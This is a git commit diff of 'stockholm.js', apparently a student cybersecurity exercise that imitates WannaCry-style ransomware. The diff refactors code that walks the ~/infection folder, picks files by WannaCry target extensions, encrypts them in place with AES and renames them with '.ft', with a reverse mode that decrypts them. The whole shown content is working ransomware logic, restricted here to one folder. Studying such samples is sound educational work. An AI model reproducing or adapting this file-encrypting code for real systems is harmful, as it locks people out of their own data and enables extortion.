6ab80679b04cabf16c8ca7301e5e23475e56c236
Jeanmichel7 <jeanmichel.rasser@laposte.net>
2023-05-23 19:33:25 +0200

    rename file

--- cy04/stockholm.js
+++ cy04/stockholm.js
@@ -21,7 +21,7 @@ const argv = yargs(process.argv.slice(2))
   .version()
   .alias("version", "v")
   .alias("help", "h").argv;
-console.log(argv)
+// console.log(argv)
 
 
 function getAllFiles(res, dir, datas) {
@@ -36,10 +36,51 @@ function getAllFiles(res, dir, datas) {
   });
 }
 
+function encryptFile(chiffrement, datas) {
+  datas.forEach((file) => {
+
+    //encrypt file
+    let content = fs.readFileSync(file);
+    let contentEncrypted = chiffrement.aesEncryptWithIV(
+      content.toString("utf8")
+    );
+    fs.writeFileSync(file, contentEncrypted);
+
+    //rename file
+    let ext = file.split(".").pop();
+    if(ext != "ft")
+      fs.renameSync(file, file + ".ft");
+
+    //display
+    if (!argv.silent) 
+      console.log("file encrypted : ", file);
+  });
+}
+
+function decryptFile(chiffrement, datas) {
+  datas.forEach((file) => {
+
+    //decrypt file
+    let content = fs.readFileSync(file);
+    let contentDecrypted = chiffrement.aesDecryptWithIV(content.toString('utf8'));
+    fs.writeFileSync(file, contentDecrypted);
+    
+    //rename file
+    let lastExt = file.split(".").slice(-2)[0];
+    if(wannaCryExtension.includes(lastExt))
+      fs.renameSync(file, file.slice(0, -3));
+
+    //display
+    if(!argv.silent)
+      console.log("file decrypted : ", file);
+  });
+}
+
 function myScript() {
   try {
     const dir = path.join(process.env.HOME, "infection");
     let datas = [];
+
     //check access
     fs.access(dir, fs.constants.R_OK | fs.constants.W_OK, (err) => {
       if (err) {
@@ -48,36 +89,21 @@ function myScript() {
       }
     });
 
-    //read dir
+    // read dir
     let res = fs.readdirSync(dir, { withFileTypes: true });
     getAllFiles(res, dir, datas);
 
-    //filter datas with targetExtension
+    // filter datas with targetExtension
     datas = datas.filter((e) => {
       let ext = e.split(".").pop();
-      return wannaCryExtension.includes(ext);
+      return wannaCryExtension.includes(ext) || ext == "ft";
     });
-    console.log("datas filtred : ", datas)
 
     let chiffrement = new Chiffrement();
-    if(argv.reverse) {
-      datas.forEach((e) => {
-        let content = fs.readFileSync(e);
-        let contentDecrypted = chiffrement.aesDecryptWithIV(content.toString('utf8'));
-        fs.writeFileSync(e, contentDecrypted);
-        if(!argv.silent) console.log("file decrypted : ", e);
-      });
-    }
-    else {
-      //encrypt datas
-      datas.forEach((e) => {
-        let content = fs.readFileSync(e);
-        let contentEncrypted = chiffrement.aesEncryptWithIV(content.toString('utf8'));
-        fs.writeFileSync(e, contentEncrypted);
-        if(!argv.silent) console.log("file encrypted : ", e);
-      });
-    }
-
+    if(argv.reverse)
+      decryptFile(chiffrement, datas);
+    else
+      encryptFile(chiffrement, datas);
   } catch (e) {
     console.error("error : ", e);
   }
